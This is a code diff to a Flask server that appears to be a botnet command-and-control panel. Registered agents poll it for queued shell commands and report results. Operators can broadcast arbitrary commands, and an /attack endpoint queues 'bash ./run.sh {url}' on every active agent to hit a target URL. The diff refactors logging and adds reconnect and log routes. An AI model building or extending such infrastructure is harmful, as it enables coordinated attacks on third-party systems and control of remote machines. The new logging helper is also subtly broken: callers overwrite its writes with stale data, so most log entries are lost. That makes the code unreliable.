@@ -42,6 +42,25 @@ def write_data(data):
             json.dump(data, f, indent=2)
 
 
+def add_log(log_type, message, agent=None, cmd=None, status="success"):
+    """Enhanced logging function"""
+    data = read_data()
+    log_entry = {
+        "ts": int(time.time()),
+        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
+        "type": log_type,
+        "message": message,
+        "status": status
+    }
+    if agent:
+        log_entry["agent"] = agent
+    if cmd:
+        log_entry["cmd"] = cmd
+    
+    data.setdefault("logs", []).append(log_entry)
+    write_data(data)
+
+
 def login_required(f):
     @wraps(f)
     def decorated(*args, **kwargs):
@@ -107,12 +126,17 @@ def agents():
     agents_list = []
     now = int(time.time())
     for aid, info in data.get("agents", {}).items():
+        last_seen_ts = info.get("last_seen", 0)
+        time_diff = now - last_seen_ts
+        status = "disabled" if info.get("disabled") else (
+            "active" if time_diff <= ACTIVE_THRESHOLD else "inactive"
+        )
+        
         agents_list.append({
             "id": aid,
-            "last_seen": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(info.get("last_seen", 0))),
-            "status": "disabled" if info.get("disabled") else (
-                "active" if (now - info.get("last_seen", 0)) <= ACTIVE_THRESHOLD else "inactive"
-            )
+            "last_seen": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(last_seen_ts)),
+            "time_diff": f"{time_diff}s ago" if time_diff > 0 else "now",
+            "status": status
         })
     return jsonify(agents_list)
 
@@ -122,22 +146,57 @@ def agents():
 def disconnect_agent(agent_id):
     data = read_data()
     if agent_id not in data.get("agents", {}):
+        add_log("disconnect", f"Failed to disconnect {agent_id}: Agent not found", agent_id, status="error")
         return jsonify({"status": "error", "msg": "Agent not found"}), 404
+    
     data["agents"][agent_id]["disabled"] = True
-    data.setdefault("logs", []).append({"ts": int(time.time()), "type": "disconnect", "agent": agent_id})
+    add_log("disconnect", f"Agent {agent_id} disconnected successfully", agent_id, status="success")
     write_data(data)
-    return jsonify({"status": "ok", "msg": f"Agent {agent_id} disconnected"})
+    return jsonify({"status": "success", "msg": f"Agent {agent_id} disconnected"})
+
+
+@app.route("/reconnect/<agent_id>", methods=["POST"])
+@login_required
+def reconnect_agent(agent_id):
+    data = read_data()
+    if agent_id not in data.get("agents", {}):
+        add_log("reconnect", f"Failed to reconnect {agent_id}: Agent not found", agent_id, status="error")
+        return jsonify({"status": "error", "msg": "Agent not found"}), 404
+    
+    data["agents"][agent_id]["disabled"] = False
+    add_log("reconnect", f"Agent {agent_id} reconnected successfully", agent_id, status="success")
+    write_data(data)
+    return jsonify({"status": "success", "msg": f"Agent {agent_id} reconnected"})
 
 
 @app.route("/disconnect_all", methods=["POST"])
 @login_required
 def disconnect_all():
     data = read_data()
+    count = 0
     for aid in data.get("agents", {}):
-        data["agents"][aid]["disabled"] = True
-    data.setdefault("logs", []).append({"ts": int(time.time()), "type": "disconnect_all"})
+        if not data["agents"][aid].get("disabled"):
+            data["agents"][aid]["disabled"] = True
+            count += 1
+    
+    add_log("disconnect_all", f"Disconnected {count} agents successfully", status="success")
     write_data(data)
-    return jsonify({"status": "ok", "msg": "All agents disconnected"})
+    return jsonify({"status": "success", "msg": f"All agents disconnected ({count} agents)"})
+
+
+@app.route("/reconnect_all", methods=["POST"])
+@login_required
+def reconnect_all():
+    data = read_data()
+    count = 0
+    for aid in data.get("agents", {}):
+        if data["agents"][aid].get("disabled"):
+            data["agents"][aid]["disabled"] = False
+            count += 1
+    
+    add_log("reconnect_all", f"Reconnected {count} agents successfully", status="success")
+    write_data(data)
+    return jsonify({"status": "success", "msg": f"All agents reconnected ({count} agents)"})
 
 
 # ----------------- STOP ALL -----------------
@@ -145,17 +204,15 @@ def disconnect_all():
 @login_required
 def stop_all():
     data = read_data()
+    count = 0
     for aid, entry in data.get("agents", {}).items():
         if not entry.get("disabled"):
             entry.setdefault("queue", []).append("__STOP__")
-    data.setdefault("logs", []).append({
-        "ts": int(time.time()),
-        "type": "stop_all",
-        "agent": "all",
-        "cmd": "__STOP__"
-    })
+            count += 1
+    
+    add_log("stop_all", f"Stop command sent to {count} active agents", "all", "__STOP__", "success")
     write_data(data)
-    return jsonify({"status": "ok", "msg": "Stop command sent to all agents"})
+    return jsonify({"status": "success", "msg": f"Stop command sent to {count} agents"})
 
 
 # ----------------- SEND CMD -----------------
@@ -171,29 +228,32 @@ def send():
         cmd = (request.form.get("cmd") or "").strip()
 
     if not cmd:
+        add_log("send", "Failed to send command: Empty command", agent, cmd, "error")
         return jsonify({"status": "error", "message": "Empty command"}), 400
 
     data = read_data()
+    count = 0
+    
     if agent == "all":
         for a in data["agents"].keys():
             if data["agents"][a].get("disabled"):
                 continue
             data["agents"][a].setdefault("queue", []).append(cmd)
+            count += 1
+        add_log("send", f"Command '{cmd}' sent to {count} agents", "all", cmd, "success")
     else:
         if agent not in data["agents"]:
+            add_log("send", f"Failed to send command to {agent}: Agent not found", agent, cmd, "error")
             return jsonify({"status": "error", "message": "Agent not found"}), 404
         if data["agents"][agent].get("disabled"):
+            add_log("send", f"Failed to send command to {agent}: Agent is disconnected", agent, cmd, "error")
             return jsonify({"status": "error", "message": "Agent is disconnected"}), 400
         data["agents"][agent].setdefault("queue", []).append(cmd)
+        add_log("send", f"Command '{cmd}' sent to agent {agent}", agent, cmd, "success")
+        count = 1
 
-    data.setdefault("logs", []).append({
-        "ts": int(time.time()),
-        "type": "send",
-        "agent": agent,
-        "cmd": cmd
-    })
     write_data(data)
-    return jsonify({"status": "ok", "message": "Command queued"})
+    return jsonify({"status": "success", "message": f"Command queued to {count} agent(s)"})
 
 
 # ----------------- CONTROL ENDPOINTS -----------------
@@ -202,9 +262,9 @@ def send():
 def pause():
     data = read_data()
     data.setdefault("meta", {})["paused"] = True
-    data.setdefault("logs", []).append({"ts": int(time.time()), "type": "pause"})
+    add_log("pause", "Server paused successfully", status="success")
     write_data(data)
-    return jsonify({"status": "ok", "msg": "Server paused"})
+    return jsonify({"status": "success", "msg": "Server paused"})
 
 
 @app.route("/resume", methods=["POST"])
@@ -212,9 +272,9 @@ def pause():
 def resume():
     data = read_data()
     data.setdefault("meta", {})["paused"] = False
-    data.setdefault("logs", []).append({"ts": int(time.time()), "type": "resume"})
+    add_log("resume", "Server resumed successfully", status="success")
     write_data(data)
-    return jsonify({"status": "ok", "msg": "Server resumed"})
+    return jsonify({"status": "success", "msg": "Server resumed"})
 
 
 # ----------------- AGENT API -----------------
@@ -233,6 +293,10 @@ def register():
     entry["last_seen"] = int(time.time())
     entry.setdefault("disabled", False)
     entry.setdefault("current_cmd", None)
+    
+    # Log registration
+    add_log("register", f"Agent {agent_id} registered successfully", agent_id, status="success")
+    
     write_data(data)
     return jsonify({"status": "ok", "msg": "registered"})
 
@@ -256,12 +320,7 @@ def task():
     if q:
         cmd = q.pop(0)
         entry["current_cmd"] = cmd
-        data.setdefault("logs", []).append({
-            "ts": int(time.time()),
-            "type": "dispatch",
-            "agent": agent,
-            "cmd": cmd
-        })
+        add_log("dispatch", f"Command dispatched to {agent}: {cmd[:100]}...", agent, cmd, "success")
         write_data(data)
         return jsonify({"cmd": cmd})
     else:
@@ -277,14 +336,19 @@ def task_result():
     result = payload.get("result") or request.form.get("result")
     if not agent or cmd is None:
         return jsonify({"status": "error", "msg": "missing fields"}), 400
+    
+    # Determine if command was successful
+    status = "success"
+    if result and ("error:" in result.lower() or "failed" in result.lower()):
+        status = "error"
+    elif result and "code=0" in result:
+        status = "success"
+    elif result and ("code=" in result and "code=0" not in result):
+        status = "warning"
+    
     data = read_data()
-    data.setdefault("logs", []).append({
-        "ts": int(time.time()),
-        "type": "result",
-        "agent": agent,
-        "cmd": cmd,
-        "result": (result[:2000] if result else "")
-    })
+    add_log("result", f"Command result from {agent}: {cmd[:50]}...", agent, cmd, status)
+    
     agent_entry = data.setdefault("agents", {}).setdefault(agent, {})
     if agent_entry.get("current_cmd") == cmd:
         agent_entry["current_cmd"] = None
@@ -303,23 +367,58 @@ def attack():
         url = (request.form.get("url") or "").strip()
 
     if not url:
+        add_log("attack", "Attack failed: URL required", status="error")
         return jsonify({"status": "error", "message": "URL required"}), 400
 
     cmd = f"bash ./run.sh {url}"
     data = read_data()
+    count = 0
+    
     for a in data.get("agents", {}):
         if not data["agents"][a].get("disabled"):
             data["agents"][a].setdefault("queue", []).append(cmd)
+            count += 1
 
-    data.setdefault("logs", []).append({
-        "ts": int(time.time()),
-        "type": "attack",
-        "agent": "all",
-        "cmd": cmd
-    })
+    add_log("attack", f"Attack launched on {url} - sent to {count} agents", "all", cmd, "success")
     write_data(data)
 
-    return jsonify({"status": "ok", "message": f"Attack queued: {cmd}"})
+    return jsonify({"status": "success", "message": f"Attack done - queued to {count} agents"})
+
+
+# ----------------- AGENT LOG ENDPOINT -----------------
+@app.route("/agent_log", methods=["POST"])
+def agent_log():
+    """Receive logs from agents"""
+    payload = request.get_json(force=True, silent=True) or {}
+    agent_id = payload.get("agent_id")
+    message = payload.get("message")
+    level = payload.get("level", "INFO")
+    
+    if agent_id and message:
+        add_log("agent_log", f"[{level}] {message}", agent_id, status="info")
+    
+    return jsonify({"status": "ok"})
+
+
+# ----------------- LOG MANAGEMENT ENDPOINTS -----------------
+@app.route("/logs")
+@login_required
+def get_logs():
+    """Get logs for frontend"""
+    data = read_data()
+    logs = list(reversed(data.get("logs", [])))[:100]  # Latest 100 logs
+    return jsonify(logs)
+
+
+@app.route("/clear_logs", methods=["POST"])
+@login_required
+def clear_logs():
+    """Clear all logs"""
+    data = read_data()
+    data["logs"] = []
+    add_log("system", "All logs cleared by admin", status="success")
+    write_data(data)
+    return jsonify({"status": "success", "message": "Logs cleared"})
 
 
 if __name__ == "__main__":
